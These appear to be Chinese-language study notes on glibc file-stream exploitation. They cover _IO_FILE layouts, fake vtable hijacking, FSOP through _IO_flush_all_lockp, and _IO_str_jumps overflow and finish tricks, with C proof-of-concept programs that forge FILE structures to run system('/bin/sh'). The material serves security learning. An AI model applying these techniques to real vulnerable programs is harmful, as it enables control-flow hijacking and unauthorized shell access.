- [IO\_file学习笔记](#io_file学习笔记)
  - [结构体](#结构体)
    - [\_IO\_FILE](#_io_file)
    - [\_IO\_jump\_t](#_io_jump_t)
    - [\_IO\_FILE\_plus](#_io_file_plus)
  - [伪造 vtable 劫持程序流程](#伪造-vtable-劫持程序流程)
  - [FSOP](#fsop)
  - [glibc-2.24 下的 IO\_FILE](#glibc-224-下的-io_file)
    - [\_IO\_strfile结构体](#_io_strfile结构体)
    - [\_IO\_str\_jumps -\> overflow的利用](#_io_str_jumps---overflow的利用)
    - [\_IO\_str\_jumps -\> finish的利用](#_io_str_jumps---finish的利用)

# IO_file学习笔记

## 结构体

### _IO_FILE

```C
// glibc-2.23
// _IO_FILE大小 : 0xD8
struct _IO_FILE
{
    int _flags; // 偏移量:0x0      大小:0x4

    char *_IO_read_ptr;    // 偏移量:0x8    大小:0x8
    char *_IO_read_end;    // 偏移量:0x10   大小:0x8
    char *_IO_read_base;   // 偏移量:0x18   大小:0x8
    char *_IO_write_base;  // 偏移量:0x20   大小:0x8
    char *_IO_write_ptr;   // 偏移量:0x28   大小:0x8
    char *_IO_write_end;   // 偏移量:0x30   大小:0x8
    char *_IO_buf_base;    // 偏移量:0x38   大小:0x8
    char *_IO_buf_end;     // 偏移量:0x40   大小:0x8
    char *_IO_save_base;   // 偏移量:0x48   大小:0x8
    char *_IO_backup_base; // 偏移量:0x50   大小:0x8
    char *_IO_save_end;    // 偏移量:0x58   大小:0x8

    struct _IO_marker *_markers; // 偏移量:0x60   大小:0x8

    struct _IO_FILE *_chain; // 偏移量:0x68   大小:0x8

    int _fileno; // 偏移量:0x70   大小:0x4
    int _flags2; // 偏移量:0x74   大小:0x4

    _IO_off_t _old_offset; // 偏移量:0x78   大小:0x8

    unsigned short _cur_column; // 偏移量:0x80   大小:0x2
    signed char _vtable_offset; // 偏移量:0x82   大小:0x1
    char _shortbuf[1];          // 偏移量:0x83   大小:0x1

    _IO_lock_t *_lock;   // 偏移量:0x88   大小:0x8
    _IO_off64_t _offset; // 偏移量:0x90   大小:0x8
    void *__pad1;        // 偏移量:0x98   大小:0x8
    void *__pad2;        // 偏移量:0xA0   大小:0x8
    void *__pad3;        // 偏移量:0xA8   大小:0x8
    void *__pad4;        // 偏移量:0xB0   大小:0x8

    size_t __pad5; // 偏移量:0xB8   大小:0x8
    int _mode;     // 偏移量:0xC0   大小:0x4

    char _unused2[15 * sizeof(int) - 4 * sizeof(void *) - sizeof(size_t)]; // 偏移量:0xC4   大小:0x14
};
```

### _IO_jump_t

```C
// _IO_jump_t大小 : 0xA8
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

### _IO_FILE_plus

```C
struct _IO_FILE_plus
{
    _IO_FILE file;                    // 0xD8
    const struct _IO_jump_t *vtable;  // *0xA8
};
```

## 伪造 vtable 劫持程序流程

根据[\_IO\_FILE\_plus](#_io_file_plus)结构体可以计算出`vtable`指针在`_IO_FILE_plus+0xD8`的位置
因为`glibc-2.23`及其以后的`glibc`的`vtable`无法写入数据，所以可以在内存中伪造一个`fake_vtable`，然后让`_IO_FILE_plus->vtable=&fake_vtable`

## FSOP

调用 `exit` 函数，程序会执行 `_IO_flush_all_lockp` ，如下:

```C
fp = (_IO_FILE *)_IO_list_all;
while (fp != NULL)
{
    // ...
    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW(fp, EOF) == EOF)
    {

        result = EOF;
    }
    // ...
}
```

可以看出当 `fp->_mode <= 0` 并且 `fp->_IO_write_ptr > fp->_IO_write_base` 时即可执行`vtable`中的`__overflow`

__利用思路:__

1. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
2. 设置 `fake_IO_FILE` 的 `_mode = 0`, `fp->_IO_write_ptr = 1`, `fp->_IO_write_base = 0`
3. 设置 `fake_IO_FILE` 的 `vtable = fake_vtable`
4. 设置 `fake_vtable->__overflow = one_gadget`
5. `main`返回时或者调用`exit`时即可触发

- 注意，只适用于glibc-2.23及其以下的版本

__示例:__

```C
// glibc-2.23
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>

void backdoor()
{
    system("/bin/sh");
}

int main()
{
    struct _IO_FILE *io = malloc(0x100);
    size_t *v = malloc(0x100);
    
    io->_mode = 0;
    io->_IO_write_ptr = 1;
    io->_IO_write_base = 0;
    v[3] = (size_t)&backdoor;

    *(size_t*)(((char*)io) + sizeof(struct _IO_FILE)) = v;

    stderr->_chain = io;

    exit(-1);
    return 0;
}
```

## glibc-2.24 下的 IO_FILE

### _IO_strfile结构体

```C
typedef void *(*_IO_alloc_type) (_IO_size_t);
typedef void (*_IO_free_type) (void*);

struct _IO_streambuf
{
  struct _IO_FILE _f;               // 0xD8
  const struct _IO_jump_t *vtable;  // *0xA8
};

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

typedef struct _IO_strfile_
{
    struct _IO_streambuf _sbf;      // 0xE0
    struct _IO_str_fields _s;       // 0x10
} _IO_strfile;
```

### _IO_str_jumps -> overflow的利用

将`vtable`设置成`_IO_str_jumps`(`const struct _IO_jump_t _IO_str_jumps = {...};`), 然后利用`_IO_str_overflow` 会调用 `(char *)(*((_IO_strfile *)fp)->_s._allocate_buffer)(new_size);`来获取`sh`

__利用思路:__

1. 伪造`fake_IO_FILE`
2. `fake_IO_FILE->_flags = 0`
3. `fake_IO_FILE->_IO_write_ptr = (/bin/sh - 100) / 2 + 1`
4. `fake_IO_FILE->_IO_buf_base = fake_IO_FILE->_IO_write_base = 0`
5. `fake_IO_FILE->_IO_buf_end = (/bin/sh - 100) / 2`
6. `fake_IO_FILE->_mode = 0`
7. `fake_IO_FILE + 0xD8 = &_IO_str_jumps`(将`vtable`设置成`_IO_str_jumps`)
8. `fake_IO_FILE + 0xE0 = &system`
9. 将`fake_IO_FILE`放入`_chain`中

__示例:__

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>

char *shell = "/bin/sh";
size_t str_jumps = ((size_t)&stdin) - (0x3EC850 - 0x3e8360);

int main()
{
    struct _IO_FILE *io = malloc(0x100);

    *(size_t *)(((char *)io) + 0x0) = 0;
    *(size_t *)(((char *)io) + 0x20) = 0;
    *(size_t *)(((char *)io) + 0x28) = (((size_t)shell) - 100) / 2 + 1;
    *(size_t *)(((char *)io) + 0x38) = 0;
    *(size_t *)(((char *)io) + 0x40) = (((size_t)shell) - 100) / 2;
    *(size_t *)(((char *)io) + 0xC0) = 0;
    *(size_t *)(((char *)io) + 0xD8) = str_jumps;
    *(size_t *)(((char *)io) + 0xE0) = (size_t)&system;

    stderr->_chain = io;

    exit(-1);
    return 0;
}
```

### _IO_str_jumps -> finish的利用

```C
void _IO_str_finish(_IO_FILE *fp, int dummy)
{
    if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
        (((_IO_strfile *)fp)->_s._free_buffer)(fp->_IO_buf_base);
    // ...
}
```

__利用思路:__

1. 伪造`fake_IO_FILE`
2. `fake_IO_FILE->_flags = 0`
3. `fake_IO_FILE->_IO_write_base = 0`
4. `fake_IO_FILE->_IO_write_ptr = 1`
5. `fake_IO_FILE->_IO_buf_base = /bin/sh`
6. `fake_IO_FILE->_mode = 0`
7. `fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)`(将`vtable`设置成`_IO_str_jumps - 8`)
8. `fake_IO_FILE + 0xE8 = system`
9. 将`fake_IO_FILE`放入`_chain`中

__示例:__

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>

char *shell = "/bin/sh";
size_t str_jumps = ((size_t)&stdin) - (0x3EC850 - 0x3e8360);

int main()
{
    struct _IO_FILE *io = malloc(0x100);

    *(size_t *)(((char *)io) + 0x0) = 0;
    *(size_t *)(((char *)io) + 0x20) = 0;
    *(size_t *)(((char *)io) + 0x28) = 1;
    *(size_t *)(((char *)io) + 0x38) = shell;
    *(size_t *)(((char *)io) + 0xC0) = 0;
    *(size_t *)(((char *)io) + 0xD8) = str_jumps - 0x8;
    *(size_t *)(((char *)io) + 0xE8) = (size_t)&system;

    stderr->_chain = io;

    exit(-1);
    return 0;
}
```
